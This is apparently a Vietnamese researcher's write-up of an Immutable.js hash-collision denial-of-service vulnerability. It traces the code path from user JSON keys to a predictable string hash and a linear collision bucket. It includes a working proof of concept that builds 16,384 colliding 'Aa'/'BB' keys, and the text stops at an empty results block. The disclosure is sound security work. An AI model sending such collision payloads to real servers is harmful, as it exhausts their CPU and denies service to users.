# CVE-2026-59880: Vua DOS Immutable.js


## Intro ngắn

Đây là câu chuyện về CVE đầu tiên của mình: `CVE-2026-59880`, một lỗi Hash Collision Denial of Service trong Immutable.js.

Nói thật đơn giản: nếu một ứng dụng nhận dữ liệu từ người dùng rồi đưa các `key` đó vào `Immutable.Map` hoặc `Immutable.Set`, attacker có thể chuẩn bị nhiều `key` khác nhau nhưng cố tình làm chúng rơi vào cùng một "xô chứa". Khi đó, thay vì xử lý nhanh như bình thường, thư viện phải lục từng món trong một danh sách dài. Kết quả là CPU tăng mạnh, request chậm, thậm chí server có thể bị nghẽn.

Advisory công khai:

- CVE: `CVE-2026-59880`
- Advisory: [GHSA-xvcm-6775-5m9r](https://github.com/immutable-js/immutable-js/security/advisories/GHSA-xvcm-6775-5m9r)
- Package affected: npm package `immutable`
- Affected versions: `<5.1.7`
- Patched versions: `4.3.9`, `5.1.8`
- Impact: CPU-bound Denial of Service
- Severity: High, CVSS v4 score `8.7`

## Background

### Immutable.js là gì?

Immutable.js là một thư viện JavaScript cung cấp các cấu trúc dữ liệu "immutable", nghĩa là dữ liệu không bị sửa trực tiếp. Khi bạn thay đổi dữ liệu, thư viện tạo ra một phiên bản mới, trong khi vẫn tái sử dụng phần lớn cấu trúc cũ để tiết kiệm bộ nhớ và tăng hiệu năng.

Ví dụ:

```js
const map1 = Immutable.Map({ name: 'alice' });
const map2 = map1.set('role', 'user');

console.log(map1.toObject());
// { name: 'alice' }

console.log(map2.toObject());
// { name: 'alice', role: 'user' }
```

Điểm quan trọng là `map1` không bị sửa sau khi gọi `.set()`.

Với object JavaScript thông thường, ta hay nghĩ `set` nghĩa là sửa trực tiếp dữ liệu cũ. Nhưng với Immutable.js, `.set()` trả về một `Map` mới.

Ở ví dụ trên:

```text
map1: dữ liệu ban đầu, chỉ có name
map2: dữ liệu mới, có cả name và role
```

Vì vậy `map1` vẫn giữ nguyên:

```js
{ name: 'alice' }
```

Còn `map2` là phiên bản mới:

```js
{ name: 'alice', role: 'user' }
```

Đại khái đây là ý nghĩa của "immutable": không sửa thẳng vào dữ liệu cũ, mà trả ra một bản mới sau mỗi lần thay đổi.

Các cấu trúc phổ biến của Immutable.js gồm:

- `Map`
- `Set`
- `List`
- `Record`
- `OrderedMap`
- `OrderedSet`

Trong bug này mình tập trung chủ yếu vào `Map` và `Set`, vì hai thằng này dùng hash để tổ chức dữ liệu bên trong.

### Map và Set dùng hash như thế nào?

Để dễ hình dung, cứ nghĩ `Map` giống như một cuốn danh bạ.

Trong danh bạ, bạn không muốn đọc từ đầu đến cuối để tìm số điện thoại của một người. Bạn muốn có một cách nhảy nhanh đến đúng vị trí cần tìm.

`hash` là một cách để làm việc đó.

Khi đưa một `key` vào `Map`, thư viện sẽ tính ra một con số từ `key` đó. Con số này giúp thư viện biết nên đặt dữ liệu ở đâu và sau này tìm lại nó ở đâu.

Ví dụ:

```js
map.set('username', 'alice');
```

Ở đây:

```text
key   = 'username'
value = 'alice'
```

Immutable.js sẽ lấy key `'username'`, tính hash cho nó, rồi dùng hash đó để chọn vị trí lưu dữ liệu.

Để dễ hình dung, giả sử hash được tính bằng một công thức rất đơn giản:

```text
hash = tổng mã số của từng ký tự
```

Với key `'username'`, ta có thể tưởng tượng:

```text
u = 117
s = 115
e = 101
r = 114
n = 110
a = 97
m = 109
e = 101
```

Cộng lại:

```text
117 + 115 + 101 + 114 + 110 + 97 + 109 + 101 = 864
```

Vậy trong ví dụ đơn giản này:

```text
hash('username') = 864
```

Sau đó `Map` dùng con số `864` này để quyết định dữ liệu (ví dụ 'alice') nên được đặt ở vị trí nào.

Nói ngắn gọn:

```text
key -> tính hash -> chọn vị trí lưu -> lưu value
```

Trong thực tế, Immutable.js không dùng công thức "cộng ký tự" đơn giản như trên. Nó dùng công thức phức tạp hơn một chút. Nhưng ý tưởng vẫn giống nhau: biến một `key` thành một con số hash để tìm vị trí lưu dữ liệu nhanh hơn.

Bình thường thì cơ chế này rất ổn, `Map` tìm và lưu dữ liệu nhanh.

### Hash collision là gì?

Hash collision xảy ra khi hai key khác nhau nhưng cho ra cùng một hash.

Ví dụ:

```text
hash("Aa") = 2112
hash("BB") = 2112
```

Hai chuỗi `"Aa"` và `"BB"` khác nhau, nhưng lại có cùng hash.

Collision không phải cứ xuất hiện là thành lỗi. Với hash map, collision là chuyện bình thường, thư viện nào dùng hash cũng phải có cách xử lý nó.

Vấn đề chỉ trở nên nguy hiểm khi attacker có thể tạo ra rất nhiều collision cùng lúc.

Lúc đó, thay vì dữ liệu được chia đều vào nhiều ngăn, tất cả bị dồn vào một ngăn duy nhất.

```text
Bình thường:
bucket 1: 2 key
bucket 2: 2 key
bucket 3: 2 key

Bị tấn công:
bucket X: xxxxxxxxx key
```

Khi cần tìm một key trong bucket X, thư viện phải quét qua một danh sách rất dài. Tới đây mới bắt đầu có mùi DoS.

## Root cause

Root cause của lỗi này, theo cách mình hiểu sau khi đọc source, nằm ở hai ý:

1. String hash của Immutable.js là deterministic, public, và không có salt.
2. Khi nhiều key cùng hash, `HashCollisionNode` dùng danh sách tuyến tính để tìm key.

Nói thẳng ra:

- Attacker đoán được cách Immutable.js tính hash.
- Attacker tạo trước nhiều key khác nhau nhưng cùng hash.
- Immutable.js nhét đống key đó vào cùng một collision bucket.
- Mỗi lần đọc/ghi, thư viện lại phải quét qua bucket đó.

## Mình đã trace code như thế nào

Tại sao lại nghi ngờ tồn tại hash collision?

Lý do đến từ chính bản chất của `Map` và `Set`, khi đọc tài liệu và source, mình thấy `Map`/`Set` của Immutable.js dùng hash để quản lý dữ liệu nội bộ. Từ đó, mình đặt ra câu hỏi

```text
Nếu nhiều key khác nhau bị tính ra cùng một hash thì sao?
```

Trong hầu hết trường hợp, collision là chuyện bình thường và thư viện vẫn xử lý ổn. Nhưng nếu:

```text
1. hash function có thể đoán trước,
2. attacker có thể kiểm soát key,
3. collision bucket được xử lý bằng danh sách tuyến tính,
```

thì vấn đề hiệu năng có thể biến thành lỗi bảo mật.

Mình cũng để ý rằng Immutable.js có API public:

```js
Immutable.hash(value)
```

API này cho phép developer tự lấy hash của một giá trị.

Điều đó không tự nó tạo ra lỗ hổng. Nhưng nó là một dấu hiệu để mình nhìn kỹ hơn:

```text
Hash được tính như thế nào?
Hash đó có random seed không?
Map và Set có dùng cùng hash này để tổ chức dữ liệu không?
Nếu nhiều key có cùng hash thì chuyện gì xảy ra?
```

Nếu hash string là deterministic và không có random seed, attacker có thể chuẩn bị sẵn collision keys trước. Sau đó, nếu ứng dụng đưa các key đó vào `Immutable.Map` hoặc `Immutable.Set`, thư viện sẽ phải xử lý collision ở runtime.

Một dấu hiệu khác là các endpoint thực tế thường nhận JSON object từ user. Trong JSON object, user không chỉ kiểm soát value mà còn có thể kiểm soát key:

```json
{
  "someUserControlledKey": "some value"
}
```

Nếu app đưa object đó vào `Immutable.Map` hoặc `Immutable.fromJS`, key do user chọn có thể đi vào hash map của Immutable.js.

Vì vậy giả thuyết ban đầu của mình là:

```text
Nếu Immutable.js dùng hash string có thể đoán trước,
và Map xử lý collision bằng cách quét tuyến tính,
thì attacker có thể tạo nhiều key cùng hash để làm CPU tăng mạnh.
```

Từ giả thuyết đó, mình mới bắt đầu trace code để trả lời những câu hỏi sau:

```text
1. User có thật sự kiểm soát được key đi vào Map không?
2. Key đó có thật sự đi vào hàm hash không?
3. Khi nhiều key cùng hash, Immutable.js xử lý collision như thế nào?
```

Mình bắt đầu từ câu hỏi thực tế hơn:

```text
Nếu một ứng dụng nhận JSON từ user rồi gọi Immutable.fromJS(req.body),
thì key do user gửi sẽ đi qua những đoạn code nào?
```

Đây là điểm quan trọng, vì một lỗi hash collision chỉ có ý nghĩa bảo mật nếu attacker có thể kiểm soát dữ liệu được hash. Nếu key chỉ là key nội bộ do developer tự viết, ví dụ `'username'`, thì attacker khó trigger lỗi này. Nhưng nếu key đến từ `req.body`, câu chuyện khác hẳn.

### Bước 1: Bắt đầu từ API mà ứng dụng hay dùng

Các pattern mình quan tâm là:

```js
Immutable.Map(req.body)
Immutable.fromJS(req.body)
state.merge(userObject)
state.mergeDeep(userObject)
```

Đây là mấy pattern mình thấy khá dễ gặp: app nhận object thường rồi muốn biến nó thành cấu trúc Immutable.js.

Mình đọc `src/fromJS.js` trước.

Đoạn quan trọng:

```js
export function fromJS(value, converter) {
  return fromJSWith(
    [],
    converter || defaultConverter,
    value,
    '',
    converter && converter.length > 2 ? [] : undefined,
    { '': value }
  );
}
```

`fromJS` về cơ bản là cửa vào để chuyển dữ liệu JavaScript thường sang dữ liệu Immutable.js.

Ví dụ:

```js
Immutable.fromJS({
  name: 'alice',
  role: 'user'
});
```

Ở ví dụ này, `value` chính là object đầu vào. Nếu object này đến từ `req.body`, thì nó có thể là dữ liệu user gửi lên.

Đoạn:

```js
converter || defaultConverter
```

có nghĩa là nếu không truyền converter riêng, Immutable.js sẽ tự dùng converter mặc định. Thực tế đa số app chắc chỉ gọi:

```js
Immutable.fromJS(req.body)
```

nên `defaultConverter` sẽ được dùng.

Sau đó `fromJSWith` xử lý object/array/iterable:

```js
const converted = converter.call(
  parentValue,
  key,
  Seq(value).map((v, k) =>
    fromJSWith(stack, converter, v, k, keyPath, value)
  ),
  keyPath && keyPath.slice()
);
```

Đoạn này là chỗ object đầu vào bắt đầu bị lôi ra duyệt.

Chỗ mình chú ý nhất là:

```js
Seq(value).map((v, k) => ...)
```

Đây là đoạn Immutable.js dùng để đi qua object đầu vào.

Trong đoạn này:

```text
value = object đang được convert
v     = value của từng field
k     = key của từng field
```

Nếu app gọi:

```js
Immutable.fromJS(req.body)
```

thì `value` ở đây chính là `req.body`.

Nếu input là:

```json
{
  "name": "alice",
  "role": "user"
}
```

thì khi `.map((v, k) => ...)` chạy, nó sẽ đi qua từng cặp key/value:

```text
Lần 1:
k = "name"
v = "alice"

Lần 2:
k = "role"
v = "user"
```

Điểm mình cần chốt là `k` chính là tên field trong JSON ban đầu.

Vậy nếu JSON do attacker gửi lên, `k` là thứ attacker kiểm soát được.

Thứ mình muốn xác nhận ở đây rất đơn giản:

```text
k chính là key của object đầu vào.
```

Nghĩa là nếu user gửi JSON:

```json
{
  "AaAa": 1,
  "BBBB": 2
}
```

thì khi Immutable.js duyệt object, nó sẽ thấy:

```text
Lần 1:
k = "AaAa"
v = 1

Lần 2:
k = "BBBB"
v = 2
```

Tức là `"AaAa"` và `"BBBB"` không chỉ nằm chơi trong request. Chúng đi vào quá trình convert như key thật.

Default converter sau đó biến sequence thành Map:

```js
function defaultConverter(k, v) {
  return isIndexed(v) ? v.toList() : isKeyed(v) ? v.toMap() : v.toSet();
}
```

`defaultConverter` quyết định sau khi duyệt xong thì dữ liệu sẽ thành loại Immutable.js nào.


```text
Nếu dữ liệu giống array -> chuyển thành List.
Nếu dữ liệu giống object có key -> chuyển thành Map.
Nếu dữ liệu giống set-like -> chuyển thành Set.
```

Với JSON object thông thường, `isKeyed(v)` sẽ đúng, nên nó đi vào:

```js
v.toMap()
```

Đây chính là bước object của user bị biến thành `Immutable.Map`.

Luồng nhìn lại sẽ là:

```text
JSON user gửi
  -> Immutable.fromJS(req.body)
  -> Seq(value).map((v, k) => ...)
  -> k là key trong JSON
  -> defaultConverter(...)
  -> v.toMap()
  -> Immutable.Map chứa các key đó
```

Tới đây trace đầu tiên cho mình biết:

```text
req.body key -> fromJS -> Seq(value).map((v, k) => ...) -> toMap()
```

Nói gọn lại: key user kiểm soát có thể trở thành key trong `Immutable.Map`.

### Bước 2: Đi vào constructor của Map

Tiếp theo mình đọc `src/Map.js`.

Constructor của `Map` có đoạn:

```js
constructor(value) {
  return value === undefined || value === null
    ? emptyMap()
    : isMap(value) && !isOrdered(value)
      ? value
      : emptyMap().withMutations((map) => {
          const iter = KeyedCollection(value);
          assertNotInfinite(iter.size);
          iter.forEach((v, k) => map.set(k, v));
        });
}
```

Constructor này nhìn hơi rối, nhưng tách ra thì có mấy nhánh:

```js
value === undefined || value === null
```

Không truyền gì thì trả về map rỗng.

```js
isMap(value) && !isOrdered(value)
```

Nếu đầu vào vốn đã là `Immutable.Map`, nó trả lại luôn, khỏi convert lại.

Phần đáng nhìn nhất là nhánh cuối:

```js
emptyMap().withMutations((map) => {
  const iter = KeyedCollection(value);
  assertNotInfinite(iter.size);
  iter.forEach((v, k) => map.set(k, v));
});
```

`KeyedCollection(value)` là bước biến đầu vào thành một thứ mà Immutable.js có thể lặp qua theo dạng key/value.

Nói dễ hiểu thì nó giống một lớp adapter.

App có thể truyền vào nhiều kiểu dữ liệu khác nhau:

```js
Map({ a: 1, b: 2 })
Map([
  ['a', 1],
  ['b', 2]
])
Map(existingImmutableMap)
```

Immutable.js không muốn constructor của `Map` phải tự xử lý riêng từng kiểu input. Thế nên nó đẩy input qua `KeyedCollection(value)` để chuẩn hóa về một dạng chung: gọi được `forEach((v, k) => ...)`.

Có thể hình dung `KeyedCollection` làm việc gần giống như pseudo-code này:

```js
function KeyedCollection(value) {
  if (value là object thường) {
    // Ví dụ: { a: 1, b: 2 }
    // Biến nó thành một collection có thể lặp:
    // k = 'a', v = 1
    // k = 'b', v = 2
  }

  if (value là array chứa các cặp [key, value]) {
    // Ví dụ: [['a', 1], ['b', 2]]
    // Biến nó thành:
    // k = 'a', v = 1
    // k = 'b', v = 2
  }

  if (value đã là Immutable collection) {
    // Dùng lại khả năng lặp key/value của collection đó.
  }
}
```

Trong source, `KeyedCollection` được export từ `src/Collection.js` và được implement qua các lớp collection nội bộ. Phần này khá dài, mình không cần bóc hết ở đây. Ý quan trọng là: nó giữ lại key của input và cho đoạn sau lặp qua từng cặp `(v, k)`.

Với object:

```json
{
  "AaAa": 1,
  "BBBB": 2
}
```

sau khi đi qua `KeyedCollection(value)`, `iter` hoạt động như một collection có key:

```text
k = "AaAa", v = 1
k = "BBBB", v = 2
```

Sau đó:

```js
iter.forEach((v, k) => map.set(k, v));
```

Nó đi qua từng key/value rồi gọi `map.set(k, v)`.

Nếu object đầu vào là:

```json
{
  "AaAa": 1,
  "BBBB": 2
}
```

thì đoạn code này tương đương:

```js
map.set('AaAa', 1);
map.set('BBBB', 2);
```

Vậy key trong JSON không bị loại bỏ hay đổi sang dạng gì khác. Nó đi thẳng vào `map.set`.

`withMutations` là tối ưu hiệu năng. Immutable.js tạm cho sửa nhiều lần trong một batch, rồi trả về kết quả immutable cuối cùng. Nhưng đoạn tối ưu này không cứu được collision, vì mỗi lần `set` vẫn phải tìm đúng vị trí cho key trong hash map.

Đoạn này xác nhận thêm lần nữa:

```text
Map(req.body) -> KeyedCollection(value) -> iter.forEach((v, k) => map.set(k, v))
```

Vậy nếu attacker kiểm soát object key, attacker kiểm soát luôn tham số `k` trong:

```js
map.set(k, v)
```

Đến đây mình có trace rõ:

```text
user-controlled JSON key
  -> Immutable.Map / Immutable.fromJS
  -> map.set(k, v)
```

### Bước 3: Từ map.set đi tới updateMap

Trong `Map`:

```js
set(k, v) {
  return updateMap(this, k, v);
}
```

Hàm `set` chỉ là một lớp vỏ mỏng. Nó không tự xử lý logic lưu trữ, mà ném việc đó sang `updateMap`.

Điểm quan trọng là `k` vẫn giữ nguyên. Nếu `k` là key user gửi, thì `updateMap` nhận chính key đó.

`updateMap` tiếp tục gọi vào node bên trong trie:

```js
newRoot = updateNode(
  map._root,
  map.__ownerID,
  0,
  undefined,
  k,
  v,
  didChangeSize,
  didAlter
);
```

Immutable.js `Map` không lưu mọi thứ trong một object phẳng. Nó dùng một cấu trúc cây dựa trên hash:

```text
Map
└── root node
    ├── child node
    ├── child node
    └── child node
```

Khi gọi `set`, Immutable.js phải đi vào cây này để tìm chỗ đặt key.

Trong lời gọi `updateNode`, các tham số đáng chú ý là:

```text
keyHash = undefined
k       = key cần lưu
v       = value cần lưu
```

Ban đầu `keyHash` là `undefined`, vì Immutable.js chưa tính hash cho key. Khi đi vào node, nếu cần, nó mới gọi `hash(key)`.

Tham số `k` vẫn là key ban đầu.

Sau đó, ở các node trong `Map.js`, nếu `keyHash` chưa có, Immutable.js gọi:

```js
keyHash = hash(key);
```

Đây là điểm nối quan trọng về mặt bảo mật:

```text
key do user kiểm soát -> hash(key)
```

Nếu attacker kiểm soát `key`, attacker kiểm soát input đi vào hàm hash.

Đây là đoạn nối từ key user-controlled sang hash function.

Trace lúc này là:

```text
user-controlled JSON key
  -> map.set(k, v)
  -> updateMap(...)
  -> updateNode(...)
  -> hash(key)
```

### Bước 4: Tìm cách hash string được tính

Từ `hash(key)`, mình đọc `src/Hash.ts`.

Hàm `hash` dispatch theo kiểu dữ liệu:

```ts
export function hash(o: unknown): number {
  ...
  switch (typeof v) {
    case 'string':
      return v.length > STRING_HASH_CACHE_MIN_STRLEN
        ? cachedHashString(v)
        : hashString(v);
```

`hash` là hàm tổng quát. Nó nhận nhiều kiểu dữ liệu khác nhau: number, string, object, symbol, null, undefined.

Trong bug này mình chỉ quan tâm đến:

```ts
case 'string':
```

Lý do đơn giản: key trong JSON object luôn là string.

Đoạn này:

```ts
return v.length > STRING_HASH_CACHE_MIN_STRLEN
  ? cachedHashString(v)
  : hashString(v);
```

có nghĩa là:

```text
Nếu string đủ dài, dùng cache để khỏi tính lại hash nhiều lần.
Nếu string ngắn, tính trực tiếp bằng hashString.
```

Nhưng cache không phải biện pháp bảo mật. Cache chỉ giúp nhanh hơn khi cùng một string được hash nhiều lần. Dù đi qua `cachedHashString` hay `hashString`, cuối cùng nó vẫn dùng một công thức deterministic có thể đoán trước.

Với string key, cuối cùng nó đi vào `hashString`:

```ts
function hashString(string: string): number {
  let hashed = 0;
  for (let ii = 0; ii < string.length; ii++) {
    hashed = (31 * hashed + string.charCodeAt(ii)) | 0;
  }
  return smi(hashed);
}
```
Nghĩa là

```text
Bắt đầu hashed = 0.
Đi qua từng ký tự trong chuỗi.
Mỗi ký tự sẽ cập nhật hashed theo công thức:
hashed = 31 * hashed + mã ký tự
Ép kết quả về số nguyên 32-bit.
Trả về hashed cuối cùng.
```

Ví dụ với `"Aa"`:

```text
Bắt đầu: hashed = 0

Ký tự "A":
charCode("A") = 65
hashed = 31 * 0 + 65 = 65

Ký tự "a":
charCode("a") = 97
hashed = 31 * 65 + 97 = 2112
```

Ví dụ với `"BB"`:

```text
Bắt đầu: hashed = 0

Ký tự "B":
charCode("B") = 66
hashed = 31 * 0 + 66 = 66

Ký tự "B" thứ hai:
charCode("B") = 66
hashed = 31 * 66 + 66 = 2112
```

Vậy:

```text
"Aa" và "BB" là hai chuỗi khác nhau nhưng có cùng hash.
```

Đây chính là điểm attacker tận dụng. Không cần đoán random seed, vì không có seed. Không cần brute force gì ghê gớm, vì công thức public và collision pattern đã biết.

Đây là điểm làm mình dừng lại (Đang check 1 lỗi khác thì gặp quả công thức này).

Công thức `31 * hash + charCode` là công thức Java-style. Nó deterministic, public, và không có salt.

Mình thử kiểm tra cặp collision:

```text
"Aa" = 65 * 31 + 97 = 2112
"BB" = 66 * 31 + 66 = 2112
```

Nếu hai khối này collision, thì việc ghép nhiều khối `Aa` / `BB` có thể tạo ra rất nhiều chuỗi khác nhau nhưng cùng hash.

Đến đây giả thuyết hình thành:

```text
Nếu tạo nhiều object key từ Aa/BB,
tất cả có thể có cùng Immutable.hash(),
và Map sẽ phải xử lý collision bucket rất lớn.
```

### Bước 5: Kiểm tra collision bucket xử lý ra sao

Nhưng chỉ biết nhiều key có cùng hash thì vẫn chưa đủ để kết luận đây là lỗi bảo mật.

Lý do là thư viện vẫn có thể xử lý tình huống này tốt. Ví dụ, khi thấy quá nhiều key rơi vào cùng một bucket, thư viện có thể đổi sang một cấu trúc khác để tìm kiếm nhanh hơn, hoặc đặt giới hạn để tránh bucket quá lớn.

Nên mình phải kiểm tra tiếp: khi collision xảy ra, Immutable.js thật sự lưu và tìm các key đó như thế nào?

Mình quay lại `src/Map.js` và tìm node xử lý collision.

Mình thấy `HashCollisionNode`:

```js
class HashCollisionNode {
  constructor(ownerID, keyHash, entries) {
    this.ownerID = ownerID;
    this.keyHash = keyHash;
    this.entries = entries;
  }
```

Tên `HashCollisionNode` nói khá rõ rồi: node này dùng khi nhiều key khác nhau có cùng hash.

Nó lưu hai thứ quan trọng:

```js
this.keyHash = keyHash;
this.entries = entries;
```

`keyHash` là hash chung của bucket này.

`entries` là danh sách các cặp key/value thật sự.

Ví dụ tưởng tượng:

```js
entries = [
  ['AaAa', 1],
  ['AaBB', 1],
  ['BBAa', 1],
  ['BBBB', 1]
];
```

Các key này có cùng hash, nhưng vẫn là key khác nhau. Vì vậy Immutable.js không thể chỉ nhìn hash rồi kết luận chúng giống nhau. Nó vẫn phải so sánh key thật.

Hàm `get`:

```js
get(shift, keyHash, key, notSetValue) {
  const entries = this.entries;
  for (let ii = 0, len = entries.length; ii < len; ii++) {
    if (is(key, entries[ii][0])) {
      return entries[ii][1];
    }
  }
  return notSetValue;
}
```

Hàm `get` đại khái làm ba việc:

```text
1. Lấy danh sách entries.
2. Duyệt từng entry trong danh sách.
3. Nếu key thật sự khớp, trả về value.
```

Đoạn nguy hiểm là vòng lặp:

```js
for (let ii = 0, len = entries.length; ii < len; ii++)
```

Đây là quét tuyến tính, tức là đi từng phần tử một.

Nếu `entries.length = 4`, tối đa nó so sánh 4 lần.

Nếu `entries.length = 16,384`, một lần `get` có thể phải so sánh tới 16,384 lần.

Đoạn:

```js
is(key, entries[ii][0])
```

là so sánh key thật sự. Immutable.js dùng `is()` vì thư viện hỗ trợ value equality, không chỉ `===`. Đây là tính năng hợp lý, nhưng trong collision bucket lớn, phép so sánh này bị lặp lại rất nhiều lần.

Và trong `update`, nó cũng scan `entries`:

```js
const entries = this.entries;
let idx = 0;
const len = entries.length;
for (; idx < len; idx++) {
  if (is(key, entries[idx][0])) {
    break;
  }
}
```

`update` được dùng khi `set` hoặc `remove`.

Khi insert một key mới, Immutable.js cần biết:

```text
Key này đã tồn tại chưa?
Nếu đã tồn tại, cập nhật value.
Nếu chưa tồn tại, thêm entry mới.
```

Muốn biết key đã tồn tại chưa, nó phải duyệt qua `entries`.

Với key collision, quá trình build map có dạng:

```text
Thêm key thứ 1: quét gần 0 entry
Thêm key thứ 2: quét gần 1 entry
Thêm key thứ 3: quét gần 2 entry
...
Thêm key thứ 16,384: quét gần 16,383 entry
```

Tổng số lần so sánh lúc này gần với:

```text
1 + 2 + 3 + ... + 16,384
```

Đó là lý do build Map với key collision có thể tiệm cận `O(N²)` => Số key tăng gấp đôi, thời gian có thể tăng gần bốn lần.

Đây là điểm xác nhận root cause:

```text
Collision bucket là một danh sách tuyến tính.
get/update phải quét từng entry.
Không có secondary hash có seed.
Không có giới hạn bucket.
Không có fallback sang cấu trúc cân bằng.
```

Vậy nếu attacker đưa 16,384 key vào cùng một collision bucket, mỗi thao tác trong bucket có thể phải quét qua rất nhiều phần tử.

### Bước 6: POC chứng minh (AI timeeeee)

Mình dùng AI hỗ trợ viết PoC để đo thử sự khác biệt giữa:

- key bình thường
- key collision

Phần tạo key:

```js
function makeCollidingStrings(rounds) {
  let keys = [''];

  for (let round = 0; round < rounds; round++) {
    const next = [];
    for (const key of keys) {
      next.push(key + 'Aa');
      next.push(key + 'BB');
    }
    keys = next;
  }

  return keys;
}
```

Hàm này tạo key collision bằng cách ghép các khối `Aa` và `BB`.

Nếu `rounds = 1`, kết quả là:

```text
Aa
BB
```

Nếu `rounds = 2`, mỗi key lại được nối thêm `Aa` hoặc `BB`:

```text
AaAa
AaBB
BBAa
BBBB
```

Nếu `rounds = 3`, số key là 8.

Mỗi vòng làm số key nhân đôi:

```text
rounds = 1 -> 2 key
rounds = 2 -> 4 key
rounds = 3 -> 8 key
rounds = 14 -> 16,384 key
```

Cách này chạy được vì `Aa` và `BB` có cùng hash theo công thức `31 * hash + charCode`. Khi ghép các khối có cùng hiệu ứng hash lại, ta tạo được nhiều chuỗi khác nhau nhưng vẫn giữ collision.

Với `rounds = 14`, số key là:

```text
2^14 = 16,384
```

Sau đó PoC kiểm tra:

```js
const collisionHash = Immutable.hash(collisionKeys[0]);

console.log(
  collisionKeys.every((key) => Immutable.hash(key) === collisionHash)
);
```

Đây là bước check quan trọng nhất trong PoC.

PoC không chỉ tạo key rồi tự tin mù rằng chúng collision. Nó gọi chính API của Immutable.js:

```js
Immutable.hash(key)
```

để kiểm tra:

```text
Tất cả key vừa sinh có cùng hash thật không?
```

Nếu kết quả là `true`, nghĩa là đống key này thật sự đánh vào đúng thuật toán hash của thư viện, không phải ăn may.

Nếu dòng này in ra `true`, nghĩa là tất cả key khác nhau nhưng cùng hash.

Chạy POC và kết quả:

```js
normal Map build
collision Map build
normal Map read all
collision Map read all
```

Mình đo cả normal và collision để có baseline.

Nếu chỉ đo mỗi collision thì rất khó kết luận:

```text
Có phải máy chậm không?
Có phải Docker chậm không? 
// Mình build trên Docker
Có phải Map build chậm sẵn không?
```

Vì vậy PoC tạo hai nhóm cùng số lượng key để dễ so sánh:

```text
normal keys: key bình thường, hash phân tán tương đối đều
collision keys: key khác nhau nhưng cùng hash
```

Sau đó:

```text
normal Map build      -> tạo Map với key bình thường
collision Map build   -> tạo Map với key collision
normal Map read all   -> đọc lại tất cả key bình thường
collision Map read all-> đọc lại tất cả key collision
```

Nếu số lượng key giống nhau nhưng collision chậm hơn rất nhiều, lúc đó gần như vấn đề nằm ở cách xử lý hash collision.

Kết quả:

```text
normal Map build: 40.6 ms
collision Map build: 3617.6 ms
normal Map read all: 7.4 ms
collision Map read all: 2614.5 ms
```
BIG TIME!!!!!!

Không phải chỉ là "có collision". Mà là:

```text
User-controlled key có thể đi tới hash().
Hash có thể bị precompute collision.
Collision bucket xử lý tuyến tính.
PoC đo được normal và collision chênh nhau hàng chục đến hàng trăm lần.
```

DOS DOS DOS DOS

Đó là chuỗi logic dẫn tới kết luận đây là một vulnerability, không chỉ là một chi tiết implementation đọc cho vui.

### Đoạn code tính hash (Đoạn này tình cờ mình gặp khi đang check lỗi khác cơ)

Trong bản vulnerable, Immutable.js tính hash cho string bằng công thức kiểu JVM/Java:

File:

```text
src/Hash.ts
```

Đoạn quan trọng:

```ts
function hashString(string: string): number {
  let hashed = 0;
  for (let ii = 0; ii < string.length; ii++) {
    hashed = (31 * hashed + string.charCodeAt(ii)) | 0;
  }
  return smi(hashed);
}
```

Hãy tạm bỏ qua phần `| 0` và `smi(hashed)`. Ý chính là:

```text
mỗi ký tự mới = hash cũ * 31 + mã ký tự hiện tại
```

Vì công thức này cố định và không có random seed, attacker có thể tạo chuỗi collision trước.

Ví dụ kinh điển:

```text
"Aa"
```

Ký tự `A` có mã ASCII là `65`, ký tự `a` có mã ASCII là `97`.

Hash của `"Aa"`:

```text
65 * 31 + 97 = 2112
```

Còn:

```text
"BB"
```

Ký tự `B` có mã ASCII là `66`.

Hash của `"BB"`:

```text
66 * 31 + 66 = 2112
```

Kết quả:

```text
hash("Aa") = hash("BB")
```

Điểm nguy hiểm là ta có thể ghép các khối này lại với nhau:

```text
AaAa
AaBB
BBAa
BBBB
```

Tất cả vẫn có thể rơi vào cùng một hash. Nếu lặp lại 14 vòng, ta có:

```text
2^14 = 16,384 key khác nhau
```

Nhưng chúng cùng đi vào một hash bucket.

### Đoạn code xử lý collision

Khi nhiều key có cùng hash, Immutable.js đưa chúng vào `HashCollisionNode`.

File:

```text
src/Map.js
```

Đoạn code đọc key:

```js
get(shift, keyHash, key, notSetValue) {
  const entries = this.entries;
  for (let ii = 0, len = entries.length; ii < len; ii++) {
    if (is(key, entries[ii][0])) {
      return entries[ii][1];
    }
  }
  return notSetValue;
}
```

Đoạn này rất quan trọng.

Để tìm một key trong collision bucket, Immutable.js sẽ đi từ đầu danh sách đến cuối danh sách, so sánh từng key một.

Nếu bucket có 10 phần tử, không sao.

Nếu bucket có 16,384 phần tử, mỗi lần đọc có thể phải đi qua rất nhiều phần tử.

Phần update cũng tương tự:

```js
const entries = this.entries;
let idx = 0;
const len = entries.length;
for (; idx < len; idx++) {
  if (is(key, entries[idx][0])) {
    break;
  }
}
```

Khi insert key mới, thư viện cũng phải kiểm tra xem key đó đã tồn tại chưa. Với collision bucket lớn, việc này cũng trở nên chậm.

### Vì sao hiệu năng suy giảm?

Bình thường, `Map` xử lý rất nhanh.

Nhưng khi attacker ép tất cả key vào cùng một collision bucket:

```text
Mỗi lần get/set: phải quét qua bucket
Build N key: có thể tiệm cận O(N^2)
Read N key: cũng có thể rất chậm
```

Tức là:

Nếu số key tăng gấp đôi, thời gian không chỉ tăng gấp đôi. Nó có thể tăng gần bốn lần.

=> Đây là điểm biến một vấn đề hiệu năng thành vấn đề bảo mật.

## Proof of Concept

1. Tạo một danh sách key bình thường.
2. Tạo một danh sách key collision bằng pattern `Aa` / `BB`.
3. Kiểm tra tất cả key collision có cùng `Immutable.hash()`.
4. Đo thời gian build `Immutable.Map`.
5. Đo thời gian đọc toàn bộ key.

PoC rút gọn:

```js
const Immutable = require('../dist/immutable.js');

function makeCollidingStrings(rounds) {
  let keys = [''];

  for (let round = 0; round < rounds; round++) {
    const next = [];
    for (const key of keys) {
      next.push(key + 'Aa');
      next.push(key + 'BB');
    }
    keys = next;
  }

  return keys;
}

function buildImmutableMap(keys) {
  let map = Immutable.Map();
  for (const key of keys) {
    map = map.set(key, 1);
  }
  return map;
}

const collisionKeys = makeCollidingStrings(14);
const collisionHash = Immutable.hash(collisionKeys[0]);

console.log(
  collisionKeys.every((key) => Immutable.hash(key) === collisionHash)
);

const map = buildImmutableMap(collisionKeys);
```

Điểm đáng chú ý không nằm ở việc crash server, mà nằm ở dòng này:

```js
collisionKeys.every((key) => Immutable.hash(key) === collisionHash)
```

Nó chứng minh các key khác nhau nhưng có cùng hash.

Khi chạy bản PoC đầy đủ với 16,384 key, kết quả trên máy test:

```text
